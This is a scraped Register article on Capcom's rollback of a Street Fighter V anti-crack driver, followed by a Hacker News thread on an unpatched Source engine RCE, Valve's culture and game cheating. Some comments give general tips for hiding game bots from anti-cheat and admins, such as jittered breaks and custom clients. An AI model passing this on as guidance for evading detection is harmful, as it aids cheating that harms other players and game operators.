[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

"The anti-crack solution does not require online connectivity in order to play the game in offline mode; however, players will be required to click-confirm each time they boot up the game. This step allows ‘handshake’ to take place between the executable and the dependent driver prior to launch."

Gamers realized something was a little off when the upgrade [brought in a new driver](http://imgur.com/a/AsDy2) and demanded operating-system-grade access to the computer before the game starts. A number of players say they couldn't even get the new version to work at all. A [full-blown online meltdown](https://www.reddit.com/r/StreetFighter/comments/544tg5/warning_to_all_sfv_pc_players/) ensued.

Just after we published this article, a Capcom rep [tweeted](https://twitter.com/StreetFighter/status/779415147873914880):

> We are in the process of rolling back the security measures added to the PC version of *Street Fighter V*. After the rollback process to the PC version, all new content from the September update will still be available to players. We apologize for the inconvenience and will have an update on the time-frame for the PC rollback solution soon.

A lesson quickly learned, it seems. ®

**Get our** [Tech Resources](https://whitepapers.theregister.com/)

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)
Share

#### More about

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)
Share

[**63**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)
COMMENTS](https://forums.theregister.com/forum/all/2016/09/23/capcom_street_fighter_v/ "View comments on this article")

#### TIP US OFF

[Send us news](https://www.theregister.com/Profile/contact/)

---

### Other stories you might like

[#### Enterprises in for a shock when they realize power and cooling demands of AI

Energy consumption set to become a key performance indicator by 2027
On-Prem15 Jan 2025 |](/2025/01/15/ai_power_cooling_demands/?td=keepreading)

[#### Shove your office mandates, people still prefer working from home

Threat to quit still preferred to commuting on packed public transport
On-Prem15 Jan 2025 | 6](/2025/01/15/shove_your_mandates_people_still/?td=keepreading)

[#### Four plead guilty in US government tech procurement fraud case

Scheme involving bribes, bid rigging and insider info may have cost US taxpayers $1.3M
Public Sector15 Jan 2025 | 1](/2025/01/15/four_plead_guilty_in_us/?td=keepreading)

[#### Why AI builds best on private clouds

AI projects under pressure to show real value in the tightest of timeframes might be worth keeping on-premises
Sponsored Feature](/2024/10/29/why_ai_builds_best_on/?td=keepreading)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=6&c=66Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D6%26raptor%3Dhawk%26pos%3Dbtm%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=6&c=66Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D6%26raptor%3Dhawk%26pos%3Dbtm%26test%3D0)

[#### SpaceX launches 2 lunar landers on path to the Moon

Blue Ghost's first time, and second time lucky for Japanese company ispace?
Science15 Jan 2025 | 6](/2025/01/15/spacex_sends_landers_to_moon/?td=keepreading)

[#### British tribunal claim aims to take a bite out of Apple over App Store fees

Collective Proceedings Order seeks £1.5B from iGiant
Applications15 Jan 2025 | 4](/2025/01/15/uk_tribunal_apple_fees/?td=keepreading)

[#### UK businesses eye AI as the cheaper, non-whining alternative to actual staff

Rising costs blamed, although any excuse to do more with less
AI + ML15 Jan 2025 | 44](/2025/01/15/uk_companies_ai_report/?td=keepreading)

[#### Foundation model for tabular data slashes training from hours to seconds

Good ol' spreadsheet data could benefit from 'revolutionary' approach to ML inferences
Databases15 Jan 2025 | 4](/2025/01/15/foundation_model_tabular_data/?td=keepreading)

[#### Microsoft’s latest on-prem Azure is for apps you don’t want in the cloud, but will manage from it

Azure Local is about hybrid management, not hybrid resource pools, and is catching up with virtual rivals
On-Prem15 Jan 2025 | 4](/2025/01/15/azure_local_explained/?td=keepreading)

[#### Boeing going backwards as production’s slowing and woes keep flowing

No such problems at Airbus, which cruised at a high level and shipped almost two planes a day last year
Offbeat15 Jan 2025 | 51](/2025/01/15/boeing_airbus_commercial_deliveries_2024/?td=keepreading)

[#### Intel Capital next into the chip giant's trebuchet, to be shot as far over the wall as possible

This'll be good for you, don't you worry, CFO tells venture fund while pulling back the sling
CxO15 Jan 2025 | 6](/2025/01/15/intel_capital_spinout/?td=keepreading)

[#### SEC sues Elon Musk for allegedly screwing investors out of $150M before Twitter takeover

Plus: SpaceX rocket re-entries spark airline delays
Bootnotes15 Jan 2025 | 29](/2025/01/15/sec_musk_complaint/?td=keepreading)

The Register ![icon](/design_picker/d518b499f8a6e2c65d4d8c49aca8299d54b03012/graphics/icon/vulture_white.png) Biting the hand that feeds IT

#### About Us

* [Contact us](https://www.theregister.com/Profile/contact/)
* [Advertise with us](https://www.theregister.com/AdvertiseWithUs/)
* [Who we are](https://www.theregister.com/Profile/about_the_register/)

#### Our Websites

* [The Next Platform](https://www.nextplatform.com/)
* [DevClass](https://devclass.com/)
* [Blocks and Files](https://blocksandfiles.com/)

#### Your Privacy

* [Cookies Policy](https://www.theregister.com/Profile/cookies/)
* [Privacy Policy](https://www.theregister.com/Profile/privacy/)
* [Ts & Cs](https://www.theregister.com/Profile/terms_and_conditions_of_use/)

[![Situation Publishing](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/std/sitpublogo_2022.png)](https://situationpublishing.com/)

Copyright. All rights reserved © 1998–2025

![no-js](/Design/graphics/std/transparent_pixel.png)



=== Content from news.ycombinator.com_3e4a6b86_20250115_100315.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D26762170) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Valve accused of ignoring existing RCE vulnerability in Source games for 2 years](https://twitter.com/the_secret_club/status/1380868759129296900) ([twitter.com/the\_secret\_club](from?site=twitter.com/the_secret_club)) | | --- | --- | --- | |  | | 225 points by [mxscho](user?id=mxscho) [on April 10, 2021](item?id=26762170)  | [hide](hide?id=26762170&goto=item%3Fid%3D26762170) | [past](https://hn.algolia.com/?query=Valve%20accused%20of%20ignoring%20existing%20RCE%20vulnerability%20in%20Source%20games%20for%202%20years&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=26762170&auth=8cbd4321e916d8c7ff02b2e924c774734297ae13) | [119 comments](item?id=26762170) |  | |  |  | [dafelst](user?id=dafelst) [on April 10, 2021](item?id=26762717)   | [next](#26763456) [–]  I have a friend who used to work at Valve as a software engineer - he mentioned to me that the entire source networking stack is chock full of unchecked buffers and all sorts of potential for fairly trivial RCEs, but due to Valve's internal structure (or lack thereof) there really isn't any incentive for anyone to fix them. This was 5-6 odd years ago and he no longer works there, so things might have changed, but based on this tweet it seems unlikely. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [TazeTSchnitzel](user?id=TazeTSchnitzel) [on April 10, 2021](item?id=26765017)   | [parent](#26762717) | [next](#26763128) [–]  > due to Valve's internal structure (or lack thereof) there really isn't any incentive for anyone to fix them This seems to be a common theme with problems at Valve. | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [on April 11, 2021](item?id=26767037)   | [root](#26762717) | [parent](#26765017) | [next](#26763128) [–]  This seems common in the industry at large. At my job it's impossible to fix an issue unless someone specifically puts in a ticket for it. I look at all the bugs in the code taunting me. Little landmines either nobody has stepped on yet or was too lazy to write a ticket for. Some tickets languish for years in the tracking system we use until the almighty scrum master doles it out. I am in hell. | | --- | --- | --- | | | |  |  | [bartvk](user?id=bartvk) [on April 11, 2021](item?id=26767745)   | [root](#26762717) | [parent](#26767037) | [next](#26763128) [–]  At my previous client, the scrum master didn't decide 100% of the work, we could pick a small percentage of technical items to work on. | | --- | --- | --- | | | |  |  | [Lutzb](user?id=Lutzb) [on April 11, 2021](item?id=26768000)   | [root](#26762717) | [parent](#26767745) | [next](#26779171) [–]  The scrum master decides the work? Why has agile become such a mess? | | --- | --- | --- | | | |  |  | [bartvk](user?id=bartvk) [on April 11, 2021](item?id=26768864)   | [root](#26762717) | [parent](#26768000) | [next](#26779171) [–]  It’s been a while, I actually forgot a bit about the process, and I got it mixed up. Point being: tasks without a clear business driver were regularly brought into the sprint by devs. | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [on April 12, 2021](item?id=26779171)   | [root](#26762717) | [parent](#26767745) | [prev](#26768000) | [next](#26763128) [–]  Other people choose their own tasks off the backlog. I chose my own and got a talking to. :) Our lead says that all work must come from the scrum master but in practice it is selectively enforced. | | --- | --- | --- | | | |  |  | [atat7024](user?id=atat7024) [on April 10, 2021](item?id=26763128)   | [parent](#26762717) | [prev](#26765017) | [next](#26763348) [–]  Game devs don't optimize for security, because they're not incentivised to. | | --- | --- | --- | | | |  |  | [klodolph](user?id=klodolph) [on April 10, 2021](item?id=26764207)   | [root](#26762717) | [parent](#26763128) | [next](#26764006) [–]  This is a common *problem* in other parts of the software industry, but Valve is missing a piece of the solution. The typical problem at software companies is that developers are incentivized only to write code for new features that will land them promotions and look good on their resume--but bugfixes and security work is not part of that. Management can counteract this with top-down initiatives. Programs like "fix-it week" or teams dedicated to security with different incentives in place. For example, Google suffers from the "promotion-oriented programming" about as badly as any other company, but they manage to take security seriously. Valve has "flat hierarchy", which goes in quotes because the hierarchy isn't really flat, it's just hidden. Because the hierarchy is hidden, it's harder to address large-scale problems like institutional priorities... because there are fewer people to delegate large-scale problems to. | | --- | --- | --- | | | |  |  | [pjmlp](user?id=pjmlp) [on April 10, 2021](item?id=26764006)   | [root](#26762717) | [parent](#26763128) | [prev](#26764207) | [next](#26763348) [–]  And then their MMO/MMORPG server gets p0wned, with everyone taking advantage of extra virtual money, adding assets to their characters for free and auto aiming packet correction. | | --- | --- | --- | | | |  |  | [serf](user?id=serf) [on April 10, 2021](item?id=26765733)   | [root](#26762717) | [parent](#26764006) | [next](#26763348) [–]  and, as evidenced by Grand Theft Auto and Counter-Strike, players continue playing with hackers. There is even reason for (say, for example) Rockstar to leave hackers alone in GTA : they act as artificial whales to lure real players into buying in-game currency in order to keep up/seek revenge. There are a few games I can think of off the top of my head that have a symbiotic relationship with hackers. | | --- | --- | --- | | | |  |  | [gameswithgo](user?id=gameswithgo) [on April 10, 2021](item?id=26765806)   | [root](#26762717) | [parent](#26765733) | [next](#26763348) [–]  The kind of hacking that happens in first person shooters has nothing to do with security failures. It is fundamentally impossible to stop aim bots. All you can do is continually play cat and mouse games to make it harder. | | --- | --- | --- | | | |  |  | [happyconcepts](user?id=happyconcepts) [on April 11, 2021](item?id=26768124)   | [root](#26762717) | [parent](#26765806) | [next](#26763348) [–]  Why is it fundamentally impossible to stop aimbots? | | --- | --- | --- | | | |  |  | [PowerBar](user?id=PowerBar) [on April 12, 2021](item?id=26775844)   | [root](#26762717) | [parent](#26768124) | [next](#26768616) [–]  Because the player's computer needs to know where the enemy is in order to render them on the screen, create footstep sounds, calculate shadows, etc. As long as the player has ultimate (root, admin, etc) access on that computer, it will always be possible for a program running with elevated privileges to read that enemy position data from the game's memory and make the required mouse movements to point at it and left-click. The only way to prevent this is to remove elevated access from the player's computer. This has been done with varying levels of success on consoles, but even then it's only a matter of time. | | --- | --- | --- | | | |  |  | [chayleaf](user?id=chayleaf) [on April 11, 2021](item?id=26768616)   | [root](#26762717) | [parent](#26768124) | [prev](#26775844) | [next](#26763348) [–]  because it requires you to distinguish between a human's aim and a bot's aim, which is pretty much impossible with a good enough bot | | --- | --- | --- | | | |  |  | [esrauch](user?id=esrauch) [on April 11, 2021](item?id=26770205)   | [root](#26762717) | [parent](#26768616) | [next](#26763348) [–]  I think Steam actually primarily catches cheaters by it seeing the other running software rather than looking at the input patterns. I'm not sure whether it would detect a cheat implemented via a camera and custom mouse hardware that sends usb events you didn't do. But I also think a lot of the hackers in both GTA and CS are cheating in ways that no regular user input could trigger, they're compromising the software at a lower level than that. | | --- | --- | --- | | | |  |  | [schmorptron](user?id=schmorptron) [on April 11, 2021](item?id=26772023)   | [root](#26762717) | [parent](#26770205) | [next](#26772656) [–]  From what I know, VAC (Valve Anti Cheat) just looks for processes running on the system and detects injections into CSs memory. Then, for CS:GO specifically there's Overwatch, in which players look at other reported players' gameplay to determine whether they were cheating, and VacNET which is a machine learning system trained on the data from Overwatch to detect aimbots that way. There's a really good talk that someone from valve gave about 3 years ago[0]. The bigger problem is that even with input recognition, one of the biggest problems are wallhacks, meaning you can see other players through walls which is an advantage that's almost as large as aimbotting in tactical shooters like CS. [0]: <https://www.youtube.com/watch?v=kTiP0zKF9bc> | | --- | --- | --- | | | |  |  | [chayleaf](user?id=chayleaf) [on April 11, 2021](item?id=26772656)   | [root](#26762717) | [parent](#26770205) | [prev](#26772023) | [next](#26763348) [–]  The comment above was specifically about aimbots, i.e. cheats that mimic a person. Such cheats can be hidden from the system well enough for it to not know there is a program controlling the input. I'm not saying all kinds of cheats can stay 100% undetected and functional with enough effort on the hackers' side, that's obviously false. | | --- | --- | --- | | | |  |  | [KyleSanderson](user?id=KyleSanderson) [on April 10, 2021](item?id=26763348)   | [parent](#26762717) | [prev](#26763128) | [next](#26763456) [–]  Indeed, there's still plenty of these. | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 10, 2021](item?id=26763456)   | [prev](#26762717) | [next](#26763587) [–]  Dozens of Counter-strike exploits exist and the cheating scene has just grown too rampantly. Valve simply doesn't care about the source engine. Any new CSGO player will tell you the anti-cheat doesn't work, I know first-hand. The lack of care regarding source engine netcode extends to every part of the source engine, including Valve Anti-cheat. The anti-cheat is trivial to reverse (several PUBLIC bypasses have existed for years on github, with zero patch), the engine source has been leaked, reverse engineered, and fiddled with by thousands of 14 year old kids. It is pathetically easy to bypass, for example, by changing a single byte in memory you can see through walls, see enemy money, etc. See this video I found about how miserably broken it is: <https://files.catbox.moe/8e3bxz.mp4> It is in my opinion the greatest loss to gaming that a classic, legendary game like Counter-strike got completely ruined by lack of care by a company that profits millions off of the case unboxings. | | --- | --- | --- | | | |  |  | [valec](user?id=valec) [on April 10, 2021](item?id=26765301)   | [parent](#26763456) | [next](#26763870) [–]  > CSGO player will tell you the anti-cheat doesn't work, I know first-hand. > It is in my opinion the greatest loss to gaming that a classic, legendary game like Counter-strike got completely ruined by lack of care by a company that profits millions off of the case unboxings. have you played the game in recent years? this has not been the case for me or the people I play with at all. when playing on high trust-factor accounts, cheating is basically eliminated. the experience for newer players is pretty bad but once you convince the system you're trustworthy, the algorithm does an extremely good job of not matching you with cheaters. what valve lacks in boring, sensible solutions they make up for with interesting often much more complex workarounds (see: the open-world csgo danger-zone map shoved into a game with a room-based engine) | | --- | --- | --- | | | |  |  | [issamehh](user?id=issamehh) [on April 10, 2021](item?id=26765387)   | [root](#26763456) | [parent](#26765301) | [next](#26765878) [–]  Just 2 days ago on prime I ran into a string of cheaters. At one point we had 2 on the enemy team and it caused someone on my team to go toggle. 3 cheaters in one match. On old accounts with everything. I know he couldn't be an expert but the person on my team says he can he blatant every game and never get banned because we're on prime. I don't want to believe that but then he had a lot of items and didn't mind spinbotting at all. | | --- | --- | --- | | | |  |  | [cmeacham98](user?id=cmeacham98) [on April 10, 2021](item?id=26765597)   | [root](#26763456) | [parent](#26765387) | [next](#26765878) [–]  From my understanding the CS:GO matchmaking basically ranks how likely of a cheater it thinks you are, and matches you with people of a similar ranking. If you're queuing with people that are bragging about blatantly cheating you're probably in the "likely cheater" group. This is all really just anecdotes, but here's my counter anecdote. I play csgo on and off with friends. None of us have ever cheated in csgo (or any other competitive online game for that matter). I'd say we get about 1 obvious cheater every 50 games, with 2-3 less obvious "maybe they're using wallhacks" as well. This is significantly improved from 3-4 years ago where we got a cheater once every 4-5 games. | | --- | --- | --- | | | |  |  | [issamehh](user?id=issamehh) [on April 11, 2021](item?id=26767103)   | [root](#26763456) | [parent](#26765597) | [next](#26766407) [–]  I didn't queue with the cheater. He was a random on my team who happened to turn the cheats on when we were losing to a cheater. He left the game and everything to launch them. The rest of us aren't cheaters. We have old steam accounts with lots of games, items, and play time. We have prime. We still got put into that lobby. I'm not good enough to look like a cheater on my playing alone either. | | --- | --- | --- | | | |  |  | [sfilipov](user?id=sfilipov) [on April 10, 2021](item?id=26766407)   | [root](#26763456) | [parent](#26765597) | [prev](#26767103) | [next](#26765878) [–]  Exactly! I get blamed for cheating and reported (trust me I don't) so I whenever I play matchmaking I'm also in the "likely cheater" group. That's why I play on third party server with their own anti cheat system. | | --- | --- | --- | | | |  |  | [gsich](user?id=gsich) [on April 10, 2021](item?id=26765878)   | [root](#26763456) | [parent](#26765301) | [prev](#26765387) | [next](#26765942) [–]  >when playing on high trust-factor accounts, cheating is basically eliminated. Yes, but this is not a technical fix. You just hope that accounts with more "value" cheat less. Which is true in most cases. | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 12, 2021](item?id=26782691)   | [root](#26763456) | [parent](#26765878) | [next](#26765942) [–]  That's another HUGE issue: stolen accounts are a massive underground market and while your skins can't be stolen usually, the account can be hacked on and get banned. You can get stolen prime accounts for under $5 and high value accounts for very cheap. Trust does actually work a lot of the time. But you'd think account security would be easy for them to crack down upon. | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 10, 2021](item?id=26765942)   | [root](#26763456) | [parent](#26765301) | [prev](#26765878) | [next](#26766946) [–]  Trust DOES help an immense amount. New players will NOT have good trust, though, hence why I said ask a new CSGO player. | | --- | --- | --- | | | |  |  | [hippira](user?id=hippira) [on April 11, 2021](item?id=26766946)   | [root](#26763456) | [parent](#26765301) | [prev](#26765942) | [next](#26763870) [–]  If you play on Asia region there’s 8/10 chance you will be matched with a hacker from China. The hacking industry there is making serious money. | | --- | --- | --- | | | |  |  | [skim\_milk](user?id=skim_milk) [on April 10, 2021](item?id=26763870)   | [parent](#26763456) | [prev](#26765301) | [next](#26764710) [–]  >and fiddled with by thousands of 14 year old kids People think you're kidding, but it's really that easy on Source! For a while, the most popular TF2 (a Valve Source game) hack was created by a 15 year old. He made at least a million dollars in profit too! (can't remember if this factoid was verified or not, but he can definitely pay for college now) I wasn't as nearly as talented but I made some hacks for fun when I was 15 or 16 years old. | | --- | --- | --- | | | |  |  | [chc4](user?id=chc4) [on April 10, 2021](item?id=26764710)   | [parent](#26763456) | [prev](#26763870) | [next](#26764973) [–]  Video game cheats and anti-cheats are almost completely disjoint from remote code exploits like what are reported in the OP. | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 10, 2021](item?id=26765948)   | [root](#26763456) | [parent](#26764710) | [next](#26764973) [–]  >The lack of care regarding source engine netcode extends to every part of the source engine, including Valve Anti-cheat. | | --- | --- | --- | | | |  |  | [grawprog](user?id=grawprog) [on April 10, 2021](item?id=26764973)   | [parent](#26763456) | [prev](#26764710) | [next](#26763772) [–]  Normally, I can handle some cheating in games, you just kinda deal with it, but holy fuck csgo was just nope. Between foul mouthed children and essentially watching God hackers play against eachother while you just die over and over. Yeah....no not exactly fun. | | --- | --- | --- | | | |  |  | [P\_I\_Staker](user?id=P_I_Staker) [on April 12, 2021](item?id=26779830)   | [root](#26763456) | [parent](#26764973) | [next](#26766339) [–]  Do you know for sure people are cheating? I have limited experience with GO, but in source expert players certainly seem like cheaters. I've definitely been called out for scouting 3 people from garage in office. I don't completely blame them, it seems like magic. | | --- | --- | --- | | | |  |  | [ChickeNES](user?id=ChickeNES) [on April 10, 2021](item?id=26766339)   | [root](#26763456) | [parent](#26764973) | [prev](#26779830) | [next](#26763772) [–]  > foul mouthed children Luckily you can now report accounts for this, and with enough reports they will be auto-muted now. | | --- | --- | --- | | | |  |  | [grawprog](user?id=grawprog) [on April 11, 2021](item?id=26767768)   | [root](#26763456) | [parent](#26766339) | [next](#26768148) [–]  That's good to know. Hearing the squeaky voice of a prepubescent child repeating racial slurs incessantly for 10 minutes straight while giggling to themselves like it's the funniest fucking thing in the world gets a bit grating and kind of tries ones patience. It's not exactly what one typically enjoys listening to while trying to relax and kill some time gaming. | | --- | --- | --- | | | |  |  | [happyconcepts](user?id=happyconcepts) [on April 11, 2021](item?id=26768148)   | [root](#26763456) | [parent](#26766339) | [prev](#26767768) | [next](#26763772) [–]  Pity you need the computer to press mute for you. I do it myself but I don't have a butler either. | | --- | --- | --- | | | |  |  | [sseneca](user?id=sseneca) [on April 10, 2021](item?id=26763772)   | [parent](#26763456) | [prev](#26764973) | [next](#26765817) [–]  The outrageous profit Valve make from skins and the like is only half the story imo, their internal structure is the rest. Some of the stories ex-devs share from that place are just... idk, they explain the company’s apparent ineptitude | | --- | --- | --- | | | |  |  | [gameswithgo](user?id=gameswithgo) [on April 10, 2021](item?id=26765817)   | [parent](#26763456) | [prev](#26763772) | [next](#26765652) [–]  No anti cheat for FPS games has ever "worked", it can't. The best you can do is make it a little hard for the cheats to keep up with your detectors or protocol changes. | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 10, 2021](item?id=26765959)   | [root](#26763456) | [parent](#26765817) | [next](#26765652) [–]  That's absolutely true! Valve anti-cheat has entirely failed at that. Free open source cheats exist that VAC just cannot detect. Period. Wanna know the secret? The fact that it's a Java cheat. | | --- | --- | --- | | | |  |  | [\_ofdw](user?id=_ofdw) [on April 11, 2021](item?id=26767157)   | [root](#26763456) | [parent](#26765959) | [next](#26765652) [–]  What's the magic of Java? Is it just that VAC doesn't/can't inspect the jvm? | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 11, 2021](item?id=26767233)   | [root](#26763456) | [parent](#26767157) | [next](#26765652) [–]  Some speculation it is Java, some that it is Java's license, some that it is the license the cheat is under (open source), etc. No one really knows why. Strangely the only difference between one java cheat that was detected and one that has been undetected for *four years*, is that the original, old java one that got detected was licensed upder GPL, and the newer one is licensed under AGPL. Then there's a newer fork with a GUI that is undetected for ~2 years. VAC seems to be... unable or unwilling to detect Java cheats. The original, old one got detected, though, and it was Java. so there is a tad of confusion. I have sent countless messages to valve offering patches for several current exploits, like the current server lagger/crasher that allows teleportation. They literally just do NOT care. At all. | | --- | --- | --- | | | |  |  | [hoffs](user?id=hoffs) [on April 10, 2021](item?id=26765652)   | [parent](#26763456) | [prev](#26765817) | [next](#26763587) [–]  You found a video that says that they detect most old cheats from hl2 days and ban them and then the video just goes to show random github repos. What is that even supposed to prove? Theres nothing stopping anyone from creating repos with cheats that get detected or don't even work. Like it's just a super cringe "gotcha" type video | | --- | --- | --- | | | |  |  | [sodality2](user?id=sodality2) [on April 10, 2021](item?id=26765935)   | [root](#26763456) | [parent](#26765652) | [next](#26763587) [–]  They are all undetected. VAC bypasses are *public* and have existed for years with no patch. | | --- | --- | --- | | | |  |  | [guidovranken](user?id=guidovranken) [on April 10, 2021](item?id=26763587)   | [prev](#26763456) | [next](#26762448) [–]  There's a place for being patient and lenient, but HackerOne consistently seems to not shut down malfunctioning programs that never pay rewards and flat out stop talking to you, yet continue to collect bugs. Such a relationship is commonly called fraud so I suggest reporting HackerOne to the Federal Trade Commission as I have. The premise of bug bounties is that the reward amount is at the discretion of the program host and that the time incurred by developing a fix will influence the moment of payout, but refusing to pay and even communicate (for years!) for clearly eligible submissions is well beyond a reasonable interpretation of the conditions, and to consistently keep facilitating this abuse is simply fraudulent. | | --- | --- | --- | | | |  |  | [tgsovlerkhgsel](user?id=tgsovlerkhgsel) [on April 10, 2021](item?id=26765858)   | [parent](#26763587) | [next](#26762448) [–]  This matches my experience. Additionally, they prohibit disclosure in such cases, effectively making them complicit in delaying (best case) or in many cases completely suppressing disclosure. | | --- | --- | --- | | | |  |  | [xyst](user?id=xyst) [on April 10, 2021](item?id=26762448)   | [prev](#26763587) | [next](#26762479) [–]  This is why I have a separate machine for "gaming" and "work" Some game companies (riot games) even install their anti-cheat software so that is loads in the ring 0 space. Even with their best efforts, cheaters will still prosper. Might even go a step further and firewall my gaming machine off from the rest of my network. | | --- | --- | --- | | | |  |  | [invokestatic](user?id=invokestatic) [on April 10, 2021](item?id=26762988)   | [parent](#26762448) | [next](#26763034) [–]  No, anti-cheats in ring0 haven't eliminated cheaters, but that was never the point. The point is to make it more difficult to cheat. And they have succeeded in that. Check any cheat forum like unknowncheats. You'll see that most hackers now have to chain multiple (complex) exploits together to get their cheats working, only to get it patched by the anti-cheats a few days/weeks later. This is way more difficult and prone to detection than ReadProcessMemory was before anti-cheats went ring0. | | --- | --- | --- | | | |  |  | [mhh\_\_](user?id=mhh__) [on April 10, 2021](item?id=26763362)   | [root](#26762448) | [parent](#26762988) | [next](#26763034) [–]  Surely the end state is cheats that even ring0 can't see i.e. read the display directly, act through the mouse. Maybe we should we run the entire OS in the games hypervisor? | | --- | --- | --- | | | |  |  | [zinclozenge](user?id=zinclozenge) [on April 10, 2021](item?id=26764012)   | [root](#26762448) | [parent](#26763362) | [next](#26764168) [–]  I was actually thinking that you should be able to build a bot for MMOs and other kind of games that require farming with a raspberry pi or arduino acting like a mouse with a camera for image recognition. Don't know how feasible that is, but that would be undetectable by anti-cheat software. | | --- | --- | --- | | | |  |  | [EamonnMR](user?id=EamonnMR) [on April 10, 2021](item?id=26764064)   | [root](#26762448) | [parent](#26764012) | [next](#26765159) [–]  Not really, some anti-cheat analysis is server-side and designed to catch people acting bot-like. | | --- | --- | --- | | | |  |  | [chaoz\_](user?id=chaoz_) [on April 10, 2021](item?id=26764839)   | [root](#26762448) | [parent](#26764064) | [next](#26764187) [–]  Yep. Not to mention that MMO game bots aim at automated resource farming and owner still needs to somehow sell it. Some of the MMO games I've played used this gold transfer "graph" analysis that worked pretty well with really low False Positive Rate. | | --- | --- | --- | | | |  |  | [Natsu](user?id=Natsu) [on April 10, 2021](item?id=26764187)   | [root](#26762448) | [parent](#26764064) | [prev](#26764839) | [next](#26765159) [–]  Yeah, even if someone made a physical robot that did everything, they'd notice when it did stuff like playing for 1,000 hours without ever taking a break or talking to anyone. | | --- | --- | --- | | | |  |  | [sp0rk](user?id=sp0rk) [on April 10, 2021](item?id=26764370)   | [root](#26762448) | [parent](#26764187) | [next](#26764617) [–]  Bots have long been designed to account for these types of checks by having scheduled hours and jittered breaks. Private messages and name mentions can alert the bot owner so they can respond manually. I've even seen bots that will pipe private messages to an IRC channel so that any number of restricted people can respond to the messages. It's been a long time since I've worked with game bots so I'm sure they're even more advanced now. | | --- | --- | --- | | | |  |  | [Natsu](user?id=Natsu) [on April 10, 2021](item?id=26766046)   | [root](#26762448) | [parent](#26764370) | [next](#26764617) [–]  Yeah, I know it's always an arms race, but the trick is to always give them something they weren't anticipating that's hard to deal with in code. There are always methods that would alert a human to something odd going on that don't alert the bot's methods for perceiving its surroundings. One of the best tricks is to show them messages via a method outside of normal chat which a normal player would see on their screen, but which a bot would not receive as 'chat'. | | --- | --- | --- | | | |  |  | [squeaky-clean](user?id=squeaky-clean) [on April 10, 2021](item?id=26764617)   | [root](#26762448) | [parent](#26764187) | [prev](#26764370) | [next](#26765159) [–]  Just have your bot log off and "sleep" randomly for 4-10 hours every night, and log off for 15 minutes every few hours during the day. If you ever get a private message, have your system play a beep (or ping you on IRC then/Discord nowadays). As for not talking to anyone, a surprising amount of people play MMOs just like that, so it's not really atypical for a player to never communicate. Runescape even has an account choice, "Ironman Mode", where you have to play the game self-sufficiently, and can't trade with or rely on any other players. You can still chat with other players if you want, but you don't have to. | | --- | --- | --- | | | |  |  | [Natsu](user?id=Natsu) [on April 10, 2021](item?id=26766030)   | [root](#26762448) | [parent](#26764617) | [next](#26765159) [–]  I've seen people try that, but the admins just sit there quietly watching them loop for an hour or something, then note how long it takes them to respond to a simple hello. Or in some games, they can send messages in a way that a human would see, but not a bot who expects the messages to come over chat. For example, waving a sign in front of the character's face with a message or whatever. It helps that the admins can also hide from normal presence detection, even though they're visible on the bot's screen, visually. I've literally watched admins ban a bot using these precise countermeasures. The trick is to always keep giving them new things they haven't thought of to adapt to. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [on April 10, 2021](item?id=26765159)   | [root](#26762448) | [parent](#26764012) | [prev](#26764064) | [next](#26765937) [–]  With MMOs you can actually reverse engineer the network protocol and build yourself a custom client. Completely avoids any anti-cheating solution since they're not even running. With mobile games it's ridiculously easy. I actually made daily task farming bots for a couple mobile games I used to play. The hardest part was getting the bot to log into the game. Completely neutralized the habit-forming strategies of these game companies. Ironically the bot was statistically indistinguishable from any sufficiently-addicted player. | | --- | --- | --- | | | |  |  | [gsich](user?id=gsich) [on April 10, 2021](item?id=26765937)   | [root](#26762448) | [parent](#26764012) | [prev](#26765159) | [next](#26764168) [–]  Example for Valorant and a Raspberry Pi: <https://www.youtube.com/watch?v=d1jz8qbzfIk> No need for a camera when you can just stream the screen. | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on April 10, 2021](item?id=26764168)   | [root](#26762448) | [parent](#26763362) | [prev](#26764012) | [next](#26763034) [–]  A lot of cheats involve reading in memory game state to see through walls, which your screen grabber won't be able to do. | | --- | --- | --- | | | |  |  | 